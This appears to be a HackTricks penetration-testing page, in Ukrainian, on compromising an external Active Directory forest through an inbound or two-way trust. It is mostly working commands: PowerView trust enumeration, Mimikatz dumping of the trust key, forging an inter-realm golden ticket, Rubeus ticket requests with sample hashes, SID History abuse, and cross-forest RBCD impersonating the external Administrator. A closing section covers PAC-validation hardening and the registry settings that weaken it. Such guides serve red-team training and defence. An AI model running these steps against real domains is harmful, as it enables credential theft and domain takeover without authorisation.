# Зовнішній домен лісу — OneWay (Inbound) або двосторонній

{{#include ../../banners/hacktricks-training.md}}

У цьому сценарії зовнішній домен довіряє вам (або обидва довіряють один одному), тому ви можете отримати певний доступ до нього.

## Перерахування

Перш за все, потрібно **перерахувати** **довіру**:
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.

# Additional trust hygiene checks (AD RSAT / AD module)
Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
```
> `SelectiveAuthentication`/`SIDFiltering*` дозволяють швидко визначити, чи ймовірно працюватимуть cross-forest abuse paths (RBCD, SIDHistory) без додаткових вимог.

У попередньому переліку було виявлено, що користувач **`crossuser`** входить до групи **`External Admins`**, яка має **адміністративний доступ** у **DC зовнішнього домену**.

## Початковий доступ

Якщо ви **не змогли** знайти жодного **особливого** доступу вашого користувача в іншому домені, ви все ще можете повернутися до AD Methodology і спробувати **privesc from an unprivileged user** (наприклад, такі методи як kerberoasting):

Ви можете використовувати **Powerview functions** для **enumerate** **іншого домену**, використовуючи параметр `-Domain`, наприклад:
```bash
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{{#ref}}
./
{{#endref}}

## Impersonation

### Вхід

Використовуючи звичайний метод з обліковими даними користувача, який має доступ до зовнішнього домену, ви повинні мати змогу отримати доступ до:
```bash
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### Зловживання SID History

Ви також можете зловживати [**SID History**](sid-history-injection.md) через forest trust.

Якщо користувача мігрували **з одного лісу в інший** і **SID Filtering не увімкнено**, стає можливим **додати SID з іншого лісу**, і цей **SID** буде **доданий** до **токена користувача** під час автентифікації **через довіру**.

> [!WARNING]
> Нагадаємо, ви можете отримати ключ підпису за допомогою
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

Ви можете **підписати** **довіреним** ключем **TGT impersonating** користувача поточного домену.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Повний спосіб видавання себе за користувача
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Міжлісовий RBCD коли ви контролюєте обліковий запис комп'ютера у довіреному лісі (no SID filtering / selective auth)

Якщо ваш зовнішній принципал (FSP) додає вас до групи, яка може записувати об'єкти комп'ютерів у довіреному лісі (наприклад, `Account Operators`, custom provisioning group), ви можете налаштувати **Resource-Based Constrained Delegation** на цільовому хості цього лісу та видавати себе за будь-якого користувача там:
```bash
# 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
# 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
Set-ADComputer -Identity victim-host$ -PrincipalsAllowedToDelegateToAccount MYLAB$
# or with PowerView
Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sidbytes_of_MYLAB}

# 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
```
Це працює лише коли **SelectiveAuthentication вимкнено** і **SID filtering** не видаляє ваш контрольний SID. Це швидкий латеральний шлях, який дозволяє уникнути підробки SIDHistory і часто пропускається при перевірках довірчих відносин.

### Посилення валідації PAC

Оновлення валідації підпису PAC для **CVE-2024-26248**/**CVE-2024-29056** додають вимогу підпису для міжлісових квитків. У **Compatibility mode** підроблені міждоменні шляхи PAC/SIDHistory/S4U все ще можуть працювати на непатчених DCs. У **Enforcement mode** непідписані або змінені дані PAC, що перетинають лісову довіру, відкидаються, якщо тільки ви не володієте ключем довіри цільового лісу. Перевизначення реєстру (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) можуть послабити це, поки вони доступні.



## Посилання

- [Microsoft KB5037754 – PAC validation changes for CVE-2024-26248 & CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
- [MS-PAC spec – SID filtering & claims transformation details](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
{{#include ../../banners/hacktricks-training.md}}
